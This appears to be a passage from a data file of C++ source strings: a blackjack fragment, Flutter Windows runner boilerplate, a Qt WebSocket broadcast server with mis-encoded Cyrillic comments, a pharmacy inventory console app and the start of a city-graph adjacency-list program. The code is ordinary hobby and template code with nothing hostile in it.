<< \"1)Hit\" << endl;\r\n\t\tcout << \"2)Stay\" << endl;\r\n\t\tcin >> Choice;\r\n\tswitch (Choice)\r\n\t{\r\n\tcase 1:\r\n\twhile (Hit)\r\n\t{\r\n\t\tPlayerHandSplit2 += SplitHit2Function(PlayerHandSplit2);\r\n\t\tcout << \"Dealer:\" ",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"weatherapp\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"server.h\"\r\n#include <QDebug>\r\n#include <QTextStream>\r\n#include <QHostInfo>\r\nQTextStream cin(stdin);\r\n\r\nServer::Server(QObject *parent) \r\n    : QWebSocketServer{\"EchoServer\",QWebSocketServer::NonSecureMode,parent}\r\n{\r\n    if(this->listen(QHostAddress::AnyIPv4,5555)){ //\u00f4\u00ee\u00f0\u00ec\u00e8\u00f0\u00ee\u00e2\u00e0\u00ed\u00e8\u00e5 \u00f1\u00ef\u00e8\u00f1\u00ea\u00e0 \u00e0\u00e4\u00f0\u00e5\u00f1\u00ee\u00e2 \u00e8 \u00e8\u00f5 \u00e2\u00fb\u00e2\u00ee\u00e4 \u00e2\u00ec\u00e5\u00f1\u00f2\u00e5 \u00f1 \u00ef\u00ee\u00f0\u00f2\u00ee\u00ec \u00e4\u00eb\u00ff \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00ff\r\n        QString ipAddress =\"\";\r\n        QHostInfo info = QHostInfo::fromName(QHostInfo::localHostName());\r\n        QList<QHostAddress> listAddr= info.addresses();\r\n        for( int i = 0; i < listAddr.size(); i ++ ){\r\n            if( listAddr.at(i).protocol() == QAbstractSocket::IPv4Protocol ){\r\n                ipAddress += \" | \";\r\n                ipAddress += listAddr.at(i).toString();\r\n            }\r\n        }\r\n        qDebug() << \"Server started successfully\"\r\n                 << \"for stop please enter \\\"stop\\\" \\n\"\r\n                 << \"Allowed addresses:\" << ipAddress\r\n                 << \"\\n Allowed ports: \" << this->serverPort();\r\n    }\r\n    else {\r\n        qDebug() << this->errorString();\r\n    }\r\n    connect(this,&Server::newConnection,this, &Server::clientConnected); //\u00ef\u00ee\u00e7\u00e2\u00ee\u00eb\u00ff\u00e5\u00f2 \u00ee\u00ef\u00f0\u00e5\u00e4\u00e5\u00eb\u00ff\u00f2\u00fc \u00e8 \u00ee\u00e1\u00f0\u00e0\u00e1\u00e0\u00f2\u00fb\u00e2\u00e0\u00f2\u00fc \u00e2\u00f5\u00ee\u00e4\u00ff\u00f9\u00e8\u00e5 \u00f1\u00ee\u00e5\u00e4\u00e8\u00ed\u00e5\u00ed\u00e8\u00ff\r\n    m_thread=new std::thread(std::bind(&Server::stopWaitingLoop,this));\r\n}\r\n\r\nServer::~Server() { //\u00ef\u00f0\u00ee\u00e8\u00f1\u00f5\u00ee\u00e4\u00e8\u00f2 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00e0 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00ed\u00e0 \u00ea\u00f3\u00f7\u00e5 \u00e4\u00eb\u00ff \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00f5 \u00f1\u00ee\u00ea\u00e5\u00f2\u00ee\u00e2 \u00e8 \u00ee\u00e1\u00fa\u00e5\u00ea\u00f2\u00e0 \u00ef\u00ee\u00f2\u00ee\u00ea\u00e0\r\n    if(m_thread){\r\n        delete m_thread;\r\n    }\r\n    for(auto &clientSock:clientsSocks){\r\n        if(clientSock!=nullptr){\r\n            clientSock->deleteLater();\r\n        }\r\n    }\r\n    clientsSocks.clear();\r\n}\r\n\r\nvoid Server::stopWaitingLoop() //\u00e1\u00e5\u00f1\u00ea\u00ee\u00ed\u00e5\u00f7\u00ed\u00fb\u00e9 \u00f6\u00e8\u00ea\u00eb \u00ee\u00e6\u00e8\u00e4\u00e0\u00fe\u00f9\u00e8\u00e9 \u00e2\u00e2\u00ee\u00e4\u00e0 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e5\u00e9 \u00ea\u00ee\u00ec\u00e0\u00ed\u00e4\u00fb \u00e4\u00eb\u00ff \u00ee\u00f1\u00f2\u00e0\u00ed\u00ee\u00e2\u00ea\u00e8 \u00f1\u00e5\u00f0\u00e2\u00e5\u00f0\u00e0\r\n{\r\n    QString input;\r\n    while(true){\r\n        cin.readLineInto(&input,0);\r\n        if(!input.isEmpty()){\r\n            if(input==\"stop\" or input == \"STOP\" or input == \"Stop\"){\r\n                break;\r\n            }\r\n        }\r\n    }\r\n    this->deleteLater();\r\n    this->close();\r\n}\r\n\r\nvoid Server::clientConnected(){ //\u00ee\u00e1\u00e5\u00f1\u00ef\u00e5\u00f7\u00e8\u00e2\u00e0\u00e5\u00f2 \u00ee\u00ef\u00ee\u00e2\u00e5\u00f9\u00e5\u00ed\u00e8\u00e5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0 \u00ee \u00e5\u00e3\u00ee \u00f3\u00f1\u00ef\u00e5\u00f8\u00ed\u00ee\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8\r\n\r\n    QWebSocket *clientSock;\r\n    clientSock = this->nextPendingConnection();\r\n    clientSock->sendBinaryMessage(QByteArray::fromStdString(std::string(\"connected\")));\r\n\r\n    //\u00f1\u00e2\u00ff\u00e7\u00fb\u00e2\u00e0\u00e5\u00f2 \u00f1\u00e8\u00e3\u00ed\u00e0\u00eb\u00fb \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00ee\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0 \u00f1 \u00f1\u00ee\u00ee\u00f2\u00e2\u00e5\u00f2\u00f1\u00f2\u00e2\u00f3\u00fe\u00f9\u00e8\u00ec\u00e8 \u00f1\u00eb\u00ee\u00f2\u00e0\u00ec\u00e8:\r\n    connect(clientSock,&QWebSocket::textMessageReceived,this,&Server::messageReceived);\r\n    connect(clientSock,&QWebSocket::disconnected,this,&Server::clientDisconnected);\r\n    connect(clientSock,&QWebSocket::disconnected,clientSock,&QWebSocket::deleteLater);\r\n\r\n    //\u00e7\u00e0\u00ed\u00ee\u00f1\u00e8\u00f2 \u00f3\u00ea\u00e0\u00e7\u00e0\u00f2\u00e5\u00eb\u00fc \u00ed\u00e0 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00f1\u00ea\u00e8\u00e9 \u00f1\u00ee\u00ea\u00e5\u00f2 \u00e2 \u00f1\u00ef\u00e8\u00f1\u00ee\u00ea\r\n    clientsSocks.push_back(clientSock);\r\n    qDebug() << \"Client with address:\" << clientSock->peerAddress().toString()\r\n             << \"has been connected\";\r\n}\r\n\r\nvoid Server::messageReceived(const QString &msg){ //\u00c2\u00fb\u00e2\u00ee\u00e4\u00e8\u00f2 \u00e2 \u00ea\u00ee\u00ed\u00f1\u00ee\u00eb\u00fc \u00e0\u00e4\u00f0\u00e5\u00f1 \u00e8 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00e5 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0, \u00e7\u00e0\u00f2\u00e5\u00ec \u00f0\u00e0\u00f1\u00f1\u00fb\u00eb\u00e0\u00e5\u00f2 \u00fd\u00f2\u00f3 \u00ef\u00e0\u00f0\u00f3 \u00e2\u00f1\u00e5\u00ec \u00ef\u00ee\u00e4\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00ed\u00fb\u00ec \u00ef\u00ee\u00eb\u00fc\u00e7\u00ee\u00e2\u00e0\u00f2\u00e5\u00eb\u00ff\u00ec\r\n    QWebSocket *clientSenderSock=(QWebSocket*)sender();\r\n    qDebug() << \"Message from: \"<< clientSenderSock->peerAddress().toString() << \" is: \" << msg;\r\n    for(auto &clientSock: clientsSocks){\r\n        if(clientSock->peerAddress()!=clientSenderSock->peerAddress()){\r\n            clientSock->sendTextMessage(clientSenderSock->peerAddress().toString()+QString(\":\")+msg);\r\n        }\r\n    }\r\n}\r\n\r\nvoid Server::clientDisconnected() //\u00ee\u00f2\u00e2\u00e5\u00f7\u00e0\u00e5\u00f2 \u00e7\u00e0 \u00e2\u00fb\u00e2\u00ee\u00e4 \u00f1\u00ee\u00ee\u00e1\u00f9\u00e5\u00ed\u00e8\u00ff \u00ee\u00e1 \u00ee\u00f2\u00ea\u00eb\u00fe\u00f7\u00e5\u00ed\u00e8\u00e8 \u00ea\u00eb\u00e8\u00e5\u00ed\u00f2\u00e0 \u00e8 \u00ee\u00f7\u00e8\u00f1\u00f2\u00ea\u00f3 \u00ef\u00e0\u00ec\u00ff\u00f2\u00e8, \u00e2\u00fb\u00e4\u00e5\u00eb\u00e5\u00ed\u00ed\u00ee\u00e9 \u00e4\u00eb\u00ff \u00e5\u00e3\u00ee \u00f1\u00ee\u00ea\u00e5\u00f2\u00e0\r\n{\r\n    QWebSocket *p_disconnectedClientSock= qobject_cast<QWebSocket *>(sender());\r\n    qDebug() << \"Client with address:\" << p_disconnectedClientSock->peerAddress().toString()\r\n             << \"has been disconnected\";\r\n    auto disconnectedClientPos=std::find(clientsSocks.begin(),clientsSocks.end(),p_disconnectedClientSock);\r\n    clientsSocks.at(std::distance(clientsSocks.begin(),disconnectedClientPos))->deleteLater();\r\n    clientsSocks.erase(disconnectedClientPos);\r\n}\r\n\r\n\r\n",
    "#include \"win32_window.h\"\n\n#include <dwmapi.h>\n#include <flutter_windows.h>\n\n#include \"resource.h\"\n\nnamespace {\n\n/// Window attribute that enables dark mode window decorations.\n///\n/// Redefined in case the developer's machine has a Windows SDK older than\n/// version 10.0.22000.0.\n/// See: https://docs.microsoft.com/windows/win32/api/dwmapi/ne-dwmapi-dwmwindowattribute\n#ifndef DWMWA_USE_IMMERSIVE_DARK_MODE\n#define DWMWA_USE_IMMERSIVE_DARK_MODE 20\n#endif\n\nconstexpr const wchar_t kWindowClassName[] = L\"FLUTTER_RUNNER_WIN32_WINDOW\";\n\n/// Registry key for app theme preference.\n///\n/// A value of 0 indicates apps should use dark mode. A non-zero or missing\n/// value indicates apps should use light mode.\nconstexpr const wchar_t kGetPreferredBrightnessRegKey[] =\n  L\"Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Themes\\\\Personalize\";\nconstexpr const wchar_t kGetPreferredBrightnessRegValue[] = L\"AppsUseLightTheme\";\n\n// The number of Win32Window objects that currently exist.\nstatic int g_active_window_count = 0;\n\nusing EnableNonClientDpiScaling = BOOL __stdcall(HWND hwnd);\n\n// Scale helper to convert logical scaler values to physical using passed in\n// scale factor\nint Scale(int source, double scale_factor) {\n  return static_cast<int>(source * scale_factor);\n}\n\n// Dynamically loads the |EnableNonClientDpiScaling| from the User32 module.\n// This API is only needed for PerMonitor V1 awareness mode.\nvoid EnableFullDpiSupportIfAvailable(HWND hwnd) {\n  HMODULE user32_module = LoadLibraryA(\"User32.dll\");\n  if (!user32_module) {\n    return;\n  }\n  auto enable_non_client_dpi_scaling =\n      reinterpret_cast<EnableNonClientDpiScaling*>(\n          GetProcAddress(user32_module, \"EnableNonClientDpiScaling\"));\n  if (enable_non_client_dpi_scaling != nullptr) {\n    enable_non_client_dpi_scaling(hwnd);\n  }\n  FreeLibrary(user32_module);\n}\n\n}  // namespace\n\n// Manages the Win32Window's window class registration.\nclass WindowClassRegistrar {\n public:\n  ~WindowClassRegistrar() = default;\n\n  // Returns the singleton registrar instance.\n  static WindowClassRegistrar* GetInstance() {\n    if (!instance_) {\n      instance_ = new WindowClassRegistrar();\n    }\n    return instance_;\n  }\n\n  // Returns the name of the window class, registering the class if it hasn't\n  // previously been registered.\n  const wchar_t* GetWindowClass();\n\n  // Unregisters the window class. Should only be called if there are no\n  // instances of the window.\n  void UnregisterWindowClass();\n\n private:\n  WindowClassRegistrar() = default;\n\n  static WindowClassRegistrar* instance_;\n\n  bool class_registered_ = false;\n};\n\nWindowClassRegistrar* WindowClassRegistrar::instance_ = nullptr;\n\nconst wchar_t* WindowClassRegistrar::GetWindowClass() {\n  if (!class_registered_) {\n    WNDCLASS window_class{};\n    window_class.hCursor = LoadCursor(nullptr, IDC_ARROW);\n    window_class.lpszClassName = kWindowClassName;\n    window_class.style = CS_HREDRAW | CS_VREDRAW;\n    window_class.cbClsExtra = 0;\n    window_class.cbWndExtra = 0;\n    window_class.hInstance = GetModuleHandle(nullptr);\n    window_class.hIcon =\n        LoadIcon(window_class.hInstance, MAKEINTRESOURCE(IDI_APP_ICON));\n    window_class.hbrBackground = 0;\n    window_class.lpszMenuName = nullptr;\n    window_class.lpfnWndProc = Win32Window::WndProc;\n    RegisterClass(&window_class);\n    class_registered_ = true;\n  }\n  return kWindowClassName;\n}\n\nvoid WindowClassRegistrar::UnregisterWindowClass() {\n  UnregisterClass(kWindowClassName, nullptr);\n  class_registered_ = false;\n}\n\nWin32Window::Win32Window() {\n  ++g_active_window_count;\n}\n\nWin32Window::~Win32Window() {\n  --g_active_window_count;\n  Destroy();\n}\n\nbool Win32Window::Create(const std::wstring& title,\n                         const Point& origin,\n                         const Size& size) {\n  Destroy();\n\n  const wchar_t* window_class =\n      WindowClassRegistrar::GetInstance()->GetWindowClass();\n\n  const POINT target_point = {static_cast<LONG>(origin.x),\n                              static_cast<LONG>(origin.y)};\n  HMONITOR monitor = MonitorFromPoint(target_point, MONITOR_DEFAULTTONEAREST);\n  UINT dpi = FlutterDesktopGetDpiForMonitor(monitor);\n  double scale_factor = dpi / 96.0;\n\n  HWND window = CreateWindow(\n      window_class, title.c_str(), WS_OVERLAPPEDWINDOW,\n      Scale(origin.x, scale_factor), Scale(origin.y, scale_factor),\n      Scale(size.width, scale_factor), Scale(size.height, scale_factor),\n      nullptr, nullptr, GetModuleHandle(nullptr), this);\n\n  if (!window) {\n    return false;\n  }\n\n  UpdateTheme(window);\n\n  return OnCreate();\n}\n\nbool Win32Window::Show() {\n  return ShowWindow(window_handle_, SW_SHOWNORMAL);\n}\n\n// static\nLRESULT CALLBACK Win32Window::WndProc(HWND const window,\n                                      UINT const message,\n                                      WPARAM const wparam,\n                                      LPARAM const lparam) noexcept {\n  if (message == WM_NCCREATE) {\n    auto window_struct = reinterpret_cast<CREATESTRUCT*>(lparam);\n    S",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include<iostream>\r\n#include<vector>\r\n#include<fstream>\r\nusing namespace std;\r\nstruct pharmacy{\r\n\tchar id;\r\n\tstring name;\r\n\tint quantity;\r\n\tint price;\r\n};\r\n    pharmacy phar;\r\n    vector<pharmacy> medics;\r\n   \r\n    addval(){\r\n    \tint choice;\r\n    \tdo{\r\n    \t\tcout<<\"Id: \";cin>>phar.id;\r\n    \t\tcout<<\"Name: \";cin>>phar.name;\r\n    \t\tcout<<\"quantity: \";cin>>phar.quantity;\r\n    \t\tcout<<\"price: \";cin>>phar.price;\r\n    \t\tmedics.push_back(phar);\r\n    \t\tcout<<\"save successfuly\"<<endl;\r\n    \t\tcout<<\"enter '0' for exit or '1' for continue: \";cin>>choice;\r\n\t\t}\r\n\t\twhile(choice!=0 && choice ==1);\r\n\t}\r\n\t\r\n\tsearch(){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<i+1<<\". name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<i+1<<\". quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<i+1<<\". price:\"<<medics[i].price<<endl<<endl;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\t\r\n\tdel (){\r\n\t\tstring n;\r\n\t\tcout<<\"Enter name for search: \";cin>>n;\r\n\t\tfor(int i=0;i<medics.size();i++){\r\n\t\t\tif(n==medics[i].name){\r\n\t\t\t\tmedics.erase(medics.begin()+i);\r\n\t\t\t\tcout<<\"deleted \"<<medics[i].name<<endl<<endl;\r\n\t\t\t}\r\n\t}\r\n}\r\n\tshow(){\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\tcout<<i+1<<\". Id:\"<<medics[i].id<<endl;\r\n\t\t\t\tcout<<\" name:\"<<medics[i].name<<endl;\r\n\t\t\t\tcout<<\" quantity:\"<<medics[i].quantity<<endl;\r\n\t\t\t\tcout<<\" price:\"<<medics[i].price<<endl<<endl;\t\r\n\t\t}\r\n\t}\r\n\t\r\n\t\tsave(const vector<pharmacy>&medics, const string& medical){\r\n\t\tofstream out(\"D:/medical.txt\");\r\n\t\tif(!out){\r\n\t\t\tcerr<<\"file not found: \"<<medical<<endl;\r\n\t\t}\r\n\t\tfor(int i=0;i<medics.size(); i++){\r\n\t\t\tout<<i+1<<\"Id: \"<<medics[i].id<<endl<<\" name:\"<<medics[i].name<<endl\r\n\t\t\t<<\"quantity: \"<<medics[i].quantity<<endl<<\"price: \"<<medics[i].price<<endl;\r\n\t\t}\r\n\t\tout.close();\r\n\t\tcout<<\"medicines saved to file \"<<medical<<endl<<endl;\r\n\t\t}\r\n\t\r\n\t\r\n    int main(){\r\n    \twhile(true){\r\n    \t\tint value;\r\n    \t\tcout<<\"\\t\\t===================\\n\\n\";\r\n\t\t    cout<<\"\\t\\t-------------------\\n\";\r\n\t\t        cout<<\"1.for add medicines: \"<<endl;\r\n    \t     \tcout<<\"2.for search medicines: \"<<endl;\r\n    \t\t    cout<<\"3.for delete medicines: \"<<endl;\r\n    \t\t    cout<<\"4.for show all medicines: \"<<endl;\r\n    \t\t    cout<<\"5.for save medicines to file: \"<<endl;\r\n    \t    \tcout<<\"6.for exit from program: \"<<endl;\r\n    \t    \tcout<<\"\\t\\t---------------------\\n\";\r\n    \t\tcout<<\"type here:\";cin>>value;\r\n    \t\tswitch(value){ system(\"cls\");\r\n    \t\t\tcase 1:{\r\n\t\t\t\t\taddval();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 2:{        system(\"cls\");\r\n\t\t\t\t\tsearch();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 3:{        system(\"cls\");\r\n\t\t\t\t\tdel();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 4:{        system(\"cls\");\r\n\t\t\t\t\tshow();\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 5:{\r\n\t\t\t\t\tsave(medics, \"D:/medical.txt\" );\r\n\t\t\t\t\tbreak;\r\n\t\t\t\t}\r\n\t\t\t\tcase 6:{\r\n\t\t\t\t\texit(0);\r\n\t\t\t\t\t\r\n\t\t\t\t\r\n\t\t\t}\r\n\t\t\tdefault:\r\n\t\t\t\t{system(\"cls\"); cout<<\"invalid input \"<<endl<<endl;}\r\n\t\t}\r\n\t}\r\n\t\r\n}\r\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include \"flutter_window.h\"\n\n#include <optional>\n\n#include \"flutter/generated_plugin_registrant.h\"\n\nFlutterWindow::FlutterWindow(const flutter::DartProject& project)\n    : project_(project) {}\n\nFlutterWindow::~FlutterWindow() {}\n\nbool FlutterWindow::OnCreate() {\n  if (!Win32Window::OnCreate()) {\n    return false;\n  }\n\n  RECT frame = GetClientArea();\n\n  // The size here must match the window dimensions to avoid unnecessary surface\n  // creation / destruction in the startup path.\n  flutter_controller_ = std::make_unique<flutter::FlutterViewController>(\n      frame.right - frame.left, frame.bottom - frame.top, project_);\n  // Ensure that basic setup of the controller was successful.\n  if (!flutter_controller_->engine() || !flutter_controller_->view()) {\n    return false;\n  }\n  RegisterPlugins(flutter_controller_->engine());\n  SetChildContent(flutter_controller_->view()->GetNativeWindow());\n\n  flutter_controller_->engine()->SetNextFrameCallback([&]() {\n    this->Show();\n  });\n\n  // Flutter can complete the first frame before the \"show window\" callback is\n  // registered. The following call ensures a frame is pending to ensure the\n  // window is shown. It is a no-op if the first frame hasn't completed yet.\n  flutter_controller_->ForceRedraw();\n\n  return true;\n}\n\nvoid FlutterWindow::OnDestroy() {\n  if (flutter_controller_) {\n    flutter_controller_ = nullptr;\n  }\n\n  Win32Window::OnDestroy();\n}\n\nLRESULT\nFlutterWindow::MessageHandler(HWND hwnd, UINT const message,\n                              WPARAM const wparam,\n                              LPARAM const lparam) noexcept {\n  // Give Flutter, including plugins, an opportunity to handle window messages.\n  if (flutter_controller_) {\n    std::optional<LRESULT> result =\n        flutter_controller_->HandleTopLevelWindowProc(hwnd, message, wparam,\n                                                      lparam);\n    if (result) {\n      return *result;\n    }\n  }\n\n  switch (message) {\n    case WM_FONTCHANGE:\n      flutter_controller_->engine()->ReloadSystemFonts();\n      break;\n  }\n\n  return Win32Window::MessageHandler(hwnd, message, wparam, lparam);\n}\n",
    "#include <iostream>\r\n#include <cstdlib>\r\n#include <string>\r\nusing namespace std;\r\n\r\nstruct node\r\n{\r\n    string vertex;\r\n    int time;\r\n    node *next;\r\n};\r\n\r\nclass adjmatlist\r\n{\r\n    int m[10][10], n, i, j;\r\n    char ch;\r\n    string v[20];\r\n    node *head[20];\r\n    node *temp = NULL;\r\n\r\npublic:\r\n    adjmatlist()\r\n    {\r\n        for (i = 0; i < 20; i++)\r\n        {\r\n            head[i] = NULL;\r\n        }\r\n    }\r\n    void getgraph();\r\n    void adjlist();\r\n    void displaym();\r\n    void displaya();\r\n};\r\n\r\nvoid adjmatlist::getgraph()\r\n{\r\n    cout << \"\\nEnter No. of cities (max. 20): \";\r\n    cin >> n;\r\n    cout << \"\\nEnter name of cities: \";\r\n    for (i = 0; i < n; i++)\r\n        cin >> v[i];\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        for (j = 0; j < n; j++)\r\n        {\r\n            cout << \"\\nIf path is present between city \" << v[i] << \" and \" << v[j] << \" then press 'y', otherwise 'n': \";\r\n            cin >> ch;\r\n            if (ch == 'y')\r\n            {\r\n                cout << \"\\nEnter time required to reach city \" << v[j] << \" from \" << v[i] << \" in minutes: \";\r\n                cin >> m[i][j];\r\n            }\r\n            else if (ch == 'n')\r\n            {\r\n                m[i][j] = 0;\r\n            }\r\n            else\r\n            {\r\n                cout << \"\\nUnknown Entry: \";\r\n            }\r\n        }\r\n    }\r\n    adjlist();\r\n}\r\n\r\nvoid adjmatlist::adjlist()\r\n{\r\n    cout << \"\\n****\";\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        node *p = new (struct node);\r\n        p->next = NULL;\r\n        p->vertex = v[i];\r\n        head[i] = p;\r\n        cout << \"\\n\" << head[i]->vertex;\r\n    }\r\n    for (i = 0; i < n; i++)\r\n    {\r\n        for (j = 0; j < n; j++)\r\n        {\r\n            if (m[i][j] != 0)\r\n            {\r\n                node *p = new (struct node);\r\n                p->vertex = v[j];\r\n                p->time = m[i][j];\r\n                p->next = NULL;\r\n                if (head[i]->next == NULL)\r\n                {\r\n                    head[i]->next = p;\r\n                }\r\n                else\r\n                